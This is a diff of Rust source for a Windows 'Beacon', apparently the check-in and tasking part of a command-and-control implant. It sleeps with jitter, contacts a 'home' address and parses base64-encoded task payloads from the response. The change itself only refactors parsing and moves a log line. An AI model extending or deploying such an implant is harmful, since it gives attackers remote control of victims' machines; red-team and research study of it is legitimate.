@@ -31,6 +31,7 @@ pub struct Beacon {
 impl Beacon {
     pub fn new(home: SocketAddrV4) -> windows::core::Result<Self> {
         let client = Client::new()?;
+
         let id = SystemTime::now()
             .duration_since(UNIX_EPOCH)
             .unwrap()
@@ -49,11 +50,6 @@ impl Beacon {
     pub fn initial_request(&mut self) -> windows::core::Result<Response> {
         self.sleep_with_jitter();
 
-        info!(
-            "sending initial request to {}:{}",
-            self.home.ip(),
-            self.home.port()
-        );
         let id_bytes = self.id.to_le_bytes();
 
         let headers = [HSTRING::from("Content-Type: application/octet-stream")];
@@ -71,6 +67,11 @@ impl Beacon {
             body: Some(&id_bytes),
         };
 
+        info!(
+            "sending initial request to {}:{}",
+            self.home.ip(),
+            self.home.port()
+        );
         let resp = self.client.request(req)?;
 
         Ok(resp)
@@ -132,12 +133,16 @@ impl Beacon {
 
         let resp = self.client.request(req)?;
 
-        let colon_index = resp.body.iter().position(|&b| b == b':');
+        self.get_task_from_response(resp.body)
+    }
+
+    fn get_task_from_response(&self, data: Vec<u8>) -> windows::core::Result<Task> {
+        let colon_index = data.iter().position(|&b| b == b':');
 
         // catch plain no-payload commands and payload commands
         let (task, payload) = match colon_index {
             Some(index) => {
-                let (task_name_bytes, payload_bytes) = resp.body.split_at(index);
+                let (task_name_bytes, payload_bytes) = data.split_at(index);
 
                 // skip the colon
                 let payload_bytes = &payload_bytes[1..];
@@ -149,7 +154,7 @@ impl Beacon {
 
                 (task_name, Some(payload_str))
             }
-            None => (String::from_utf8(resp.body)?.trim().to_lowercase(), None),
+            None => (String::from_utf8(data)?.trim().to_lowercase(), None),
         };
 
         // decode base64 payload if present
